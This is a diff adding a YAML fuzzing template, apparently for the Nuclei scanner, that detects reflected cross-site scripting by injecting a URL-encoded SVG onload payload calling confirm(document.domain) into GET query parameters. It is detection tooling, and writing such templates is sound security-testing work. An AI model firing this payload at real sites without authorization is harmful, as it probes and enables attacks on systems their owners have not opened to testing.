@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-confirm
+
+info:
+  name: Reflection XSS Detection with Confirm
+  author: netbaan
+  severity: low
+  description: |
+    This template detects reflection XSS vulnerabilities by injecting a payload that triggers the confirm() function.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E"  # URL encoded payload
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
